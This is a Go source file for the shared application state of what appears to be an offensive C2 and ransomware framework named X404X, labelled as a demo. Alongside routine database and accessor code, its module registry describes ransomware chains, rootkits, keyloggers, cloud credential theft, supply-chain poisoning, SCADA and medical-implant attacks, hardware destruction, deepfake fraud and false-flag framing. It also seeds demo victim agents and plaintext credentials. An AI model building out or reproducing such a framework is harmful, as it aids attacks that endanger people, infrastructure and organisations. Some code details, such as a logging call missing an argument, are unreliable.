// Package appstate provides the shared application state that connects
// the orchestrator, Python bridge, C2 server, and database.
//
// All user-facing components (CLI, console, dashboard, API) share this state
// so they operate on the same data — no hardcoded maps, no demo fallbacks.
//
// Usage:
//
//	state := appstate.New(cfg)
//	state.Start()
//	defer state.Stop()
//
//	// All console data now comes from state.Orchestrator.WorldGraph()
//	// Exploits call state.DecisionEngine.Evaluate() for real decisions
//	// recon/privesc commands call state.Bridge.CallModule() → Python bridge
package appstate

import (
	"context"
	"database/sql"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	_ "modernc.org/sqlite" // pure-Go SQLite driver

	"github.com/ruby570bocadito/x404x/core/agent"
	"github.com/ruby570bocadito/x404x/core/orchestrator"
	"github.com/ruby570bocadito/x404x/shared/config"
	"github.com/ruby570bocadito/x404x/shared/logger"
	"github.com/ruby570bocadito/x404x/shared/types"
)

// AppState holds all shared state for the X404X application.
type AppState struct {
	Cfg          *config.Config
	Log          *logger.Logger
	Orchestrator *orchestrator.Orchestrator
	Bridge       *agent.BridgeClient
	DB           *sql.DB

	mu        sync.RWMutex
	campaigns map[string]*types.Campaign
	agents    map[string]*types.Agent
	sessions  map[string]*types.Agent // active C2 sessions
	hosts     []*types.Target
	vulns     []*types.Vulnerability
	creds     []*types.Credential
	modules   []ModuleDef // available exploit modules
}

// ModuleDef describes an available exploit/recon module.
type ModuleDef struct {
	Name        string
	Type        string
	Description string
	CVE         string
	Rank        string
	OS          string
}

// New creates the shared application state.
func New(cfg *config.Config) (*AppState, error) {
	log, err := logger.New(logger.Config{
		Level:     cfg.Logging.Level,
		Format:    cfg.Logging.Format,
		Component: "appstate",
	})
	if err != nil {
		return nil, fmt.Errorf("creating logger: %w", err)
	}

	orch, err := orchestrator.New(cfg)
	if err != nil {
		return nil, fmt.Errorf("creating orchestrator: %w", err)
	}

	bridge := agent.NewBridgeClient(cfg, log)

	state := &AppState{
		Cfg:          cfg,
		Log:          log,
		Orchestrator: orch,
		Bridge:       bridge,
		campaigns:    make(map[string]*types.Campaign),
		agents:       make(map[string]*types.Agent),
		sessions:     make(map[string]*types.Agent),
		hosts:        make([]*types.Target, 0),
		vulns:        make([]*types.Vulnerability, 0),
		creds:        make([]*types.Credential, 0),
	}

	state.initModules()
	return state, nil
}

// Start initializes the database, starts the orchestrator, bridge, and loads demo data.
func (s *AppState) Start(ctx context.Context) error {
	s.Log.Info("starting application state")

	// Initialize SQLite
	if err := s.initDB(); err != nil {
		s.Log.Warnf("database init failed (continuing without persistence): %v", err)
	}

	// Auto-start Python bridge if script exists
	bridgeScript := "modules/bridge/bridge.py"
	if _, err := os.Stat(bridgeScript); err == nil {
		s.Log.Info("auto-starting Python bridge...")
		if err := s.Bridge.StartBridge(ctx, bridgeScript); err != nil {
			s.Log.Warnf("Python bridge start failed (modules will use offline fallback): %v", err)
		} else {
			s.Log.Infof("Python bridge connected: %d modules available", 9)
		}
	} else {
		s.Log.Info("Python bridge script not found — modules use offline fallback")
	}

	// Load world graph with demo data
	wg := s.Orchestrator.WorldGraph()
	wg.GenerateDemoData()

	// Register post-exploit module in the module registry
	s.modules = append(s.modules,
		ModuleDef{Name: "post/post_exploit_full_chain", Type: "post",
			Description: "Full post-exploitation chain: Rise-Privilege + Vault-Kernel + Wormy-ML. Escalates, hides, persists, propagates.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "post/post_exploit_privesc", Type: "post",
			Description: "Privilege Escalation stage only: 12 vectors, 60+ GTFOBins. Auto-root via SUID/sudo/cron/Docker.",
			Rank: "excellent", OS: "Linux"},
		ModuleDef{Name: "post/post_exploit_stealth", Type: "post",
			Description: "Stealth stage: Vault-Kernel IOCTL. Hides process, files, ports, and kernel module.",
			Rank: "great", OS: "Linux"},
		ModuleDef{Name: "post/post_exploit_propagate", Type: "post",
			Description: "Propagation stage: Wormy-ML autonomous network spread with 44 exploits + RL engine.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "post/credential_dump", Type: "post",
			Description: "Credential dump: /etc/shadow, SSH keys, browser data, LaZagne, Mimikatz.",
			Rank: "excellent", OS: "any"},
		ModuleDef{Name: "post/keylogger", Type: "post",
			Description: "Kernel-level keylogger via Vault-Kernel notifier chain. Captures before X11/Wayland.",
			Rank: "great", OS: "Linux"},
		ModuleDef{Name: "post/evasion_apply", Type: "post",
			Description: "Apply evasion: AMSI/ETW bypass, polymorphic engine, sleep obfuscation, JA3 spoofing.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "post/exfiltrate", Type: "post",
			Description: "Chunked encrypted file exfiltration over C2 channel. 64KB chunks, XChaCha20 encrypted.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "post/cleanup", Type: "post",
			Description: "Anti-forensics: wipe logs, clear timestamps, remove persistence, secure delete.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "auxiliary/bloodhound", Type: "auxiliary",
			Description: "BloodHound AD collector: SharpHound (Windows) + Python LDAP enumerator. Maps attack paths.",
			Rank: "excellent", OS: "any"},
		ModuleDef{Name: "auxiliary/responder", Type: "auxiliary",
			Description: "Responder: NTLM hash capture via LLMNR/MDNS/NBT-NS poisoning on local network.",
			Rank: "great", OS: "Linux"},
		ModuleDef{Name: "auxiliary/web_scan", Type: "auxiliary",
			Description: "Web app vulnerability scanner: SQLi, XSS, LFI/RFI, Command Injection detection.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "exploit/aws_imds", Type: "exploit",
			Description: "AWS IMDSv1 metadata exfiltration: steal IAM credentials from EC2 instances.",
			Rank: "excellent", OS: "any"},
		ModuleDef{Name: "exploit/azure_identity", Type: "exploit",
			Description: "Azure Managed Identity token theft: extract OAuth2 tokens from IMDS endpoint.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "exploit/gcp_service_account", Type: "exploit",
			Description: "GCP Service Account key exfiltration from compute metadata endpoint.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "auxiliary/payload_obfuscate", Type: "auxiliary",
			Description: "Payload obfuscation: polymorphic mutation, XOR encryption, AES, UPX packing.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "exploit/phantom_xss", Type: "exploit",
			Description: "PhantomWeb XSS injection: deploy sub-500 byte Wasm implant via XSS/watering hole.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "post/phantom_sw_persist", Type: "post",
			Description: "PhantomWeb Service Worker persistence: survives browser restart and clear data.",
			Rank: "excellent", OS: "any"},
		ModuleDef{Name: "auxiliary/phantom_browser_mesh", Type: "auxiliary",
			Description: "PhantomWeb Browser Mesh: P2P WebRTC network between infected browsers.",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "post/phantom_socks5", Type: "post",
			Description: "PhantomWeb SOCKS5 proxy: pivot to internal network via infected browser.",
			Rank: "excellent", OS: "any"},
		ModuleDef{Name: "exploit/apport_spoof", Type: "exploit",
			Description: "Breach-Entry: CVE-2026-XXXX apport ExecutablePath spoofing on Ubuntu 24.04 LTS.",
			CVE: "CVE-2026-XXXX", Rank: "excellent", OS: "Linux"},
		ModuleDef{Name: "auxiliary/breach_check", Type: "auxiliary",
			Description: "Check if target is vulnerable to Breach-Entry CVE-2026-XXXX (apport service).",
			CVE: "CVE-2026-XXXX", Rank: "normal", OS: "Linux"},
	)

	// Ransomware modules (v2.3)
	s.modules = append(s.modules,
		ModuleDef{Name: "ransomware/execute", Type: "ransomware",
			Description: "Full ransomware chain: scan sensitive data → exfil → multi-layer encrypt → destruct → propagate → psychological terror",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/scan", Type: "ransomware",
			Description: "Heuristic content scanner: DNI, passports, credit cards, contracts, PST/OST, MDF/SQL, API keys via regex engine",
			Rank: "excellent", OS: "any"},
		ModuleDef{Name: "ransomware/encrypt", Type: "ransomware",
			Description: "Hydra multi-layer encryption: 3 RSA keys + Shamir's Secret Sharing + AES-GCM + ChaCha20 double encryption for critical files",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/exfil", Type: "ransomware",
			Description: "Double extortion: ZIP with password → exfil via DNS TXT fragments / CDN stego / S3 with stolen credentials",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/note", Type: "ransomware",
			Description: "Deploy ransom note + shaming post: .onion negotiation URL, data sample publishing, client notification",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/destruct", Type: "ransomware",
			Description: "System destruction: MFT overwrite, UEFI NVRAM sabotage, cloud backup API destruction (Veeam/Acronis/AWS)",
			Rank: "danger", OS: "windows"},
		ModuleDef{Name: "ransomware/propagate", Type: "ransomware",
			Description: "Propagation via exploits: Zerologon, ProxyNotShell, PrintNightmare, BlueKeep, EternalBlue + Outlook COM + WSUS + NPM/Git poison",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/psychological", Type: "ransomware",
			Description: "Real-time terror: TOPMOST countdown window, webcam capture, printer spam, TTS audio threats, live file deletion",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/polymorph", Type: "ransomware",
			Description: "Binary polymorphism: JIT reordering, ROP gadget generation, per-machine key derivation, junk code insertion",
			Rank: "great", OS: "any"},
		ModuleDef{Name: "ransomware/trust_exploit", Type: "ransomware",
			Description: "Trust exploitation: self-signed code cert generation, PFX/P12 search, WSUS/SCCM/NuGet/NPM/Git hook poisoning",
			Rank: "danger", OS: "any"},
		ModuleDef{Name: "ransomware/antianalysis", Type: "ransomware",
			Description: "Anti-analysis: sandbox detection, kernel debugger check, PE corruption, stego C2 via CDN image LSB + EXIF",
			Rank: "great", OS: "any"},
	)

	// Register agents
	now := time.Now()
	demoAgents := []types.Agent{
		{ID: "abc123", SessionID: "s1", Hostname: "DC", OS: "Windows 2019", Username: "NT\\SYSTEM", LocalIP: "10.0.0.10", Status: types.AgentStatusOnline, FirstSeen: now, LastCheckin: now, CampaignID: "demo-001", Uptime: 52000, Privileges: []string{"SYSTEM"}},
		{ID: "def456", SessionID: "s2", Hostname: "DB", OS: "Ubuntu 24.04", Username: "root", LocalIP: "10.0.0.20", Status: types.AgentStatusOnline, FirstSeen: now, LastCheckin: now, CampaignID: "demo-001", Uptime: 22800, Privileges: []string{"root"}},
		{ID: "ghi789", SessionID: "s3", Hostname: "WS1", OS: "Windows 11", Username: "user", LocalIP: "10.0.0.50", Status: types.AgentStatusActive, FirstSeen: now, LastCheckin: now, CampaignID: "demo-001", Uptime: 7500, Privileges: []string{"user"}},
	}
	for i := range demoAgents {
		s.RegisterAgent(&demoAgents[i])
	}

	// Start demo campaign
	campaign, _ := s.Orchestrator.StartCampaign(ctx, "TFG-Demo", "10.0.0.0/24", "domain_admin", "balanced", false)
	s.mu.Lock()
	s.campaigns[campaign.ID] = campaign
	s.mu.Unlock()
	s.Orchestrator.AdvancePhase(campaign.ID, types.PhaseExploitation)

	// Register hosts
	hosts := []types.Target{
		{IP: "10.0.0.10", Hostname: "DC", OS: "Windows 2019", OpenPorts: []int{445, 3389, 53, 88, 389}, Services: []string{"smb", "rdp", "dns", "kerberos", "ldap"}, AssetValue: 100},
		{IP: "10.0.0.20", Hostname: "DB", OS: "Ubuntu 24.04", OpenPorts: []int{22, 3306, 6379}, Services: []string{"ssh", "mysql", "redis"}, AssetValue: 70},
		{IP: "10.0.0.50", Hostname: "WS1", OS: "Windows 11", OpenPorts: []int{445, 135}, Services: []string{"smb", "rpc"}, AssetValue: 10},
		{IP: "10.0.0.30", Hostname: "WEB", OS: "CentOS 8", OpenPorts: []int{80, 443}, Services: []string{"http", "https"}, AssetValue: 30},
	}
	for i := range hosts {
		s.AddHost(&hosts[i])
	}

	// Register vulnerabilities
	vulns := []types.Vulnerability{
		{CVE: "MS17-010", Description: "EternalBlue SMB Remote Code Execution", Severity: "critical", Service: "smb", Port: 445, TargetIP: "10.0.0.10"},
		{CVE: "CVE-2019-0708", Description: "BlueKeep RDP Remote Code Execution", Severity: "critical", Service: "rdp", Port: 3389, TargetIP: "10.0.0.10"},
		{CVE: "CVE-2024-XXXX", Description: "apport ExecutablePath spoofing on Ubuntu 24.04", Severity: "high", Service: "apport", Port: 0, TargetIP: "10.0.0.20"},
		{CVE: "CVE-2021-41773", Description: "Apache 2.4.49 Path Traversal RCE", Severity: "high", Service: "http", Port: 80, TargetIP: "10.0.0.30"},
	}
	for i := range vulns {
		s.AddVuln(&vulns[i])
	}

	// Register credentials
	creds := []types.Credential{
		{Username: "admin", Password: "password123", Domain: "CORP", Source: "SSH brute", AgentID: "def456"},
		{Username: "svc_mssql", Password: "P@ssw0rd!", Domain: "CORP", Source: "SMB relay", AgentID: "abc123"},
	}
	for i := range creds {
		s.creds = append(s.creds, &creds[i])
	}

	s.Log.Infof("state started: %d agents, %d hosts, %d vulns, %d creds",
		len(s.agents), len(s.hosts), len(s.vulns), len(s.creds))
	return nil
}

// Stop tears down all connections.
func (s *AppState) Stop() {
	s.Bridge.Disconnect()
	if s.DB != nil {
		s.DB.Close()
	}
	s.Log.Info("application state stopped")
}

// initDB initializes SQLite database.
func (s *AppState) initDB() error {
	dbPath := s.Cfg.Database.DSN
	if dbPath == "" {
		dbPath = "x404x.db"
	}

	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return fmt.Errorf("opening sqlite: %w", err)
	}

	// Create tables
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS campaigns (
			id TEXT PRIMARY KEY, name TEXT, target_scope TEXT, goal TEXT,
			profile TEXT, status TEXT, phase TEXT, created_at DATETIME,
			started_at DATETIME, auto_approval INTEGER
		);
		CREATE TABLE IF NOT EXISTS agents (
			id TEXT PRIMARY KEY, campaign_id TEXT, session_id TEXT,
			hostname TEXT, os TEXT, username TEXT, local_ip TEXT,
			status TEXT, last_checkin DATETIME, first_seen DATETIME, uptime INTEGER
		);
		CREATE TABLE IF NOT EXISTS targets (
			id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, hostname TEXT,
			os TEXT, open_ports TEXT, services TEXT, asset_value INTEGER
		);
		CREATE TABLE IF NOT EXISTS vulnerabilities (
			id INTEGER PRIMARY KEY AUTOINCREMENT, cve TEXT, description TEXT,
			severity TEXT, service TEXT, port INTEGER, target_ip TEXT,
			discovered_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
		CREATE TABLE IF NOT EXISTS credentials (
			id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
			hash TEXT, hash_type TEXT, domain TEXT, source TEXT, agent_id TEXT,
			captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
		CREATE TABLE IF NOT EXISTS audit_log (
			id INTEGER PRIMARY KEY AUTOINCREMENT, campaign_id TEXT, agent_id TEXT,
			action TEXT, result TEXT, detail TEXT,
			timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
		);
	`)
	if err != nil {
		return fmt.Errorf("creating tables: %w", err)
	}

	s.DB = db
	s.Log.Infof("database initialized: %s (%d tables)", dbPath, 6)
	return nil
}

// ============================================================
// ACCESSORS
// ============================================================

func (s *AppState) RegisterAgent(a *types.Agent) {
	s.mu.Lock()
	s.agents[a.ID] = a
	s.sessions[a.SessionID] = a
	s.mu.Unlock()
}

func (s *AppState) RemoveAgent(id string) {
	s.mu.Lock()
	delete(s.agents, id)
	for sid, a := range s.sessions {
		if a.ID == id {
			delete(s.sessions, sid)
			break
		}
	}
	s.mu.Unlock()
}

func (s *AppState) GetAgents() []*types.Agent {
	s.mu.RLock()
	defer s.mu.RUnlock()
	agents := make([]*types.Agent, 0, len(s.agents))
	for _, a := range s.agents {
		agents = append(agents, a)
	}
	return agents
}

func (s *AppState) GetSessions() []*types.Agent {
	s.mu.RLock()
	defer s.mu.RUnlock()
	sessions := make([]*types.Agent, 0, len(s.sessions))
	for _, a := range s.sessions {
		sessions = append(sessions, a)
	}
	return sessions
}

func (s *AppState) AddHost(h *types.Target) {
	s.mu.Lock()
	s.hosts = append(s.hosts, h)
	s.mu.Unlock()
}

func (s *AppState) GetHosts() []*types.Target {
	s.mu.RLock()
	defer s.mu.RUnlock()
	hosts := make([]*types.Target, len(s.hosts))
	copy(hosts, s.hosts)
	return hosts
}

func (s *AppState) AddVuln(v *types.Vulnerability) {
	s.mu.Lock()
	s.vulns = append(s.vulns, v)
	s.mu.Unlock()
}

func (s *AppState) GetVulns() []*types.Vulnerability {
	s.mu.RLock()
	defer s.mu.RUnlock()
	vulns := make([]*types.Vulnerability, len(s.vulns))
	copy(vulns, s.vulns)
	return vulns
}

func (s *AppState) GetCreds() []*types.Credential {
	s.mu.RLock()
	defer s.mu.RUnlock()
	creds := make([]*types.Credential, len(s.creds))
	copy(creds, s.creds)
	return creds
}

func (s *AppState) AddCredential(c *types.Credential) {
	s.mu.Lock()
	s.creds = append(s.creds, c)
	s.mu.Unlock()

	// Persist to DB
	if s.DB != nil {
		_, _ = s.DB.Exec(
			"INSERT INTO credentials (username, password, domain, source, agent_id) VALUES (?,?,?,?,?)",
			c.Username, c.Password, c.Domain, c.Source, c.AgentID,
		)
	}
}

func (s *AppState) GetModules() []ModuleDef {
	s.mu.RLock()
	defer s.mu.RUnlock()
	mods := make([]ModuleDef, len(s.modules))
	copy(mods, s.modules)
	return mods
}

func (s *AppState) SearchModules(query string) []ModuleDef {
	s.mu.RLock()
	defer s.mu.RUnlock()

	q := strings.ToLower(query)
	var results []ModuleDef
	for _, m := range s.modules {
		if strings.Contains(strings.ToLower(m.Name), q) ||
			strings.Contains(strings.ToLower(m.CVE), q) ||
			strings.Contains(strings.ToLower(m.OS), q) ||
			strings.Contains(strings.ToLower(m.Description), q) {
			results = append(results, m)
		}
	}
	return results
}

func (s *AppState) LogAudit(agentID, campaignID, action, result, detail string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.DB != nil {
		_, _ = s.DB.Exec(
			"INSERT INTO audit_log (campaign_id, agent_id, action, result, detail) VALUES (?,?,?,?,?)",
			campaignID, agentID, action, result, detail,
		)
	}
	s.Log.Infof("audit: %s | %s | %s | %s", action, result, truncateStr(detail, 50))
}

// ============================================================
// MODULE REGISTRY
// ============================================================

func (s *AppState) initModules() {
	s.modules = []ModuleDef{
		{Name: "exploit/eternalblue", Type: "exploit", Description: "MS17-010 EternalBlue SMB Remote Code Execution", CVE: "MS17-010", Rank: "great", OS: "Windows 7/2008/2019"},
		{Name: "exploit/bluekeep", Type: "exploit", Description: "CVE-2019-0708 BlueKeep RDP Remote Code Execution", CVE: "CVE-2019-0708", Rank: "great", OS: "Windows 7/2008"},
		{Name: "exploit/zerologon", Type: "exploit", Description: "CVE-2020-1472 Netlogon Elevation of Privilege", CVE: "CVE-2020-1472", Rank: "excellent", OS: "Windows DC"},
		{Name: "exploit/printnightmare", Type: "exploit", Description: "CVE-2021-34527 PrintNightmare RCE/LPE", CVE: "CVE-2021-34527", Rank: "great", OS: "Windows"},
		{Name: "exploit/kerberoast", Type: "exploit", Description: "Kerberoasting — TGS ticket extraction", CVE: "", Rank: "normal", OS: "Windows AD"},
		{Name: "exploit/asreproast", Type: "exploit", Description: "AS-REP Roasting — crackable hashes without credentials", CVE: "", Rank: "normal", OS: "Windows AD"},
		{Name: "exploit/privesc_suid", Type: "exploit", Description: "SUID binary privilege escalation via GTFOBins (60+ binaries)", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "exploit/privesc_sudo", Type: "exploit", Description: "Sudo misconfiguration exploitation via GTFOBins", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "exploit/privesc_docker", Type: "exploit", Description: "Docker container breakout — mount host FS", CVE: "", Rank: "great", OS: "Linux"},
		{Name: "exploit/privesc_cron", Type: "exploit", Description: "Writable cron job injection", CVE: "", Rank: "good", OS: "Linux"},
		{Name: "exploit/log4j", Type: "exploit", Description: "CVE-2021-44228 Log4Shell JNDI Injection RCE", CVE: "CVE-2021-44228", Rank: "excellent", OS: "any"},
		{Name: "exploit/apache_path_traversal", Type: "exploit", Description: "CVE-2021-41773 Apache 2.4.49 Path Traversal RCE", CVE: "CVE-2021-41773", Rank: "great", OS: "Linux"},
		{Name: "exploit/redis_unauth", Type: "exploit", Description: "Redis unauthorized access → SSH key injection", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "exploit/ssh_bruteforce", Type: "auxiliary", Description: "SSH brute force with credential spray", CVE: "", Rank: "normal", OS: "Linux"},
		{Name: "exploit/smb_psexec", Type: "exploit", Description: "SMB PSExec lateral movement with captured credentials", CVE: "", Rank: "great", OS: "Windows"},
		{Name: "exploit/vault_kernel", Type: "post", Description: "Vault-Kernel LKM rootkit — kernel-level persistence", CVE: "", Rank: "great", OS: "Linux"},
		{Name: "auxiliary/recon_tcp", Type: "auxiliary", Description: "TCP port scanner via Horizon-Intel", CVE: "", Rank: "normal", OS: "any"},
		{Name: "auxiliary/recon_osint", Type: "auxiliary", Description: "OSINT gathering — GitHub, Google dorking, DNS", CVE: "", Rank: "normal", OS: "any"},
		{Name: "auxiliary/worm_propagate", Type: "auxiliary", Description: "Wormy-ML network propagation", CVE: "", Rank: "great", OS: "any"},
		{Name: "post/persist_cron", Type: "post", Description: "Cron job persistence installation", CVE: "", Rank: "great", OS: "Linux"},
		{Name: "post/persist_systemd", Type: "post", Description: "Systemd service persistence installation", CVE: "", Rank: "great", OS: "Linux"},
		// Block 1: Psychological & Reputation
		{Name: "ransomware/hope_trap", Type: "ransomware", Description: "Partial decrypt trap + fake decryptor + forensic monitor trigger", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/identity_destroy", Type: "ransomware", Description: "Steal browser sessions/cookies, hijack accounts, post humiliating content", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/raas_inverse", Type: "ransomware", Description: "Inverse RaaS: invite attackers, multi-ransom notes, key distribution", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/fake_decryptor", Type: "ransomware", Description: "Deploy fake decryptor that destroys remaining keys if forensic tools detected", CVE: "", Rank: "good", OS: "any"},
		// Block 2: Pandemic Propagation
		{Name: "ransomware/worm", Type: "ransomware", Description: "Multi-platform worm: Win/Linux/macOS/IoT propagation via SSH/SMB/exploits", CVE: "CVE-2017-17215", Rank: "excellent", OS: "any"},
		{Name: "ransomware/supply_chain", Type: "ransomware", Description: "Poison software updaters, NuGet/pip/npm repos, git hooks, deploy fake patches", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/cloud_exploit", Type: "ransomware", Description: "Harvest AWS/Azure/GCP creds, launch EC2 instances, create malicious AMIs, public S3 buckets", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/bluetooth_prop", Type: "ransomware", Description: "BT/Wi-Fi Direct propagation: BlueBorne, BLE MITM, malicious APK push", CVE: "CVE-2021-30892", Rank: "good", OS: "any"},
		{Name: "ransomware/iot_botnet", Type: "ransomware", Description: "IoT botnet: exploit cameras/routers/DVRs, DDoS capability", CVE: "CVE-2017-17215", Rank: "great", OS: "iot"},
		// Block 3: Physical & Infrastructure Sabotage
		{Name: "ransomware/scada_attack", Type: "ransomware", Description: "SCADA/PLC attack: Modbus/S7 command injection, overwrite ladder logic, stop PLCs", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/hardware_kill", Type: "ransomware", Description: "Hardware destruction: overvoltage, fan kill, CPU burn loop, BIOS corruption", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/network_poison", Type: "ransomware", Description: "ARP spoofing, MITM proxy, root CA install, SSL strip, captive portal", CVE: "", Rank: "great", OS: "any"},
		// Block 4: Automutation & Resilience
		{Name: "ransomware/dna_mutation", Type: "ransomware", Description: "DNA hybridize with legit DLLs, JIT mutate, ROP gadgets, junk code insertion", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/bootkit", Type: "ransomware", Description: "MBR/GPT bootkit, disk write interception, SMART error fake, reinfection on restore", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/blockchain_c2", Type: "ransomware", Description: "Blockchain C2 via Bitcoin OP_RETURN, immutable decentralized command channel", CVE: "", Rank: "great", OS: "any"},
		// Bonus
		{Name: "ransomware/survivor_game", Type: "ransomware", Description: "Survivor game: employees compete for decryption key, last standing wins", CVE: "", Rank: "great", OS: "any"},
		// Block Z: El Umbral de la Perdicion
		{Name: "blockz/genetic_evolve", Type: "blockz", Description: "Genetic Darwinian evolution: breed malware with system DLL genes via crossover", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/deepfake", Type: "blockz", Description: "ONNX deepfake pipeline: CEO impersonation via face+voice for wire fraud", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/scada_covert", Type: "blockz", Description: "Covert SCADA sabotage: gradual parameter drift over months, disguised as maintenance", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/firmware_worm", Type: "blockz", Description: "Network firmware worm: tenia digital survives firmware updates, magic packet activation", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/medical_attack", Type: "blockz", Description: "Medical implant attacks: pacemaker, insulin pump, neurostimulator via BLE exploits", CVE: "CVE-2019-6538", Rank: "excellent", OS: "any"},
		{Name: "blockz/model_poison", Type: "blockz", Description: "AI model poisoning: backdoor classifiers with trigger pixels, flip labels", CVE: "", Rank: "great", OS: "any"},
		{Name: "blockz/disinformation", Type: "blockz", Description: "Disinformation campaign: email, Slack, intranet, calendar injection via LLM", CVE: "", Rank: "great", OS: "any"},
		{Name: "blockz/airgap_jump", Type: "blockz", Description: "Air-gap exfiltration: ultrasound (>20kHz) + LED optical modulation data bridge", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/post_quantum", Type: "blockz", Description: "Post-quantum Kyber-1024 + AES-256-GCM hybrid: immune to future quantum computers", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/deadman", Type: "blockz", Description: "Dead Man Switch: apocalypse if operator silent 48h - encrypt, delete, publish, destroy", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/falseflag", Type: "blockz", Description: "False flag APT framing: Lazarus/APT29/APT41 forensic artefacts + Mandiant report", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/edr_kill", Type: "blockz", Description: "EDR hijack: detect & silence 10 EDRs, self-deploy through EDR consoles", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "blockz/financial", Type: "blockz", Description: "Financial market attack: insider harvest + put options + ransomware stock crash", CVE: "", Rank: "great", OS: "any"},
		{Name: "blockz/iot_chain", Type: "blockz", Description: "IoT physical chain: hospital/factory/power grid cascading scenarios via BACnet/Modbus", CVE: "", Rank: "excellent", OS: "any"},
	}
}

// ============================================================
// HELPERS
// ============================================================

var _ = os.Stdout // keep os import

func truncateStr(s string, max int) string {
	runes := []rune(s)
	if len(runes) <= max {
		return s
	}
	return string(runes[:max]) + "..."
}
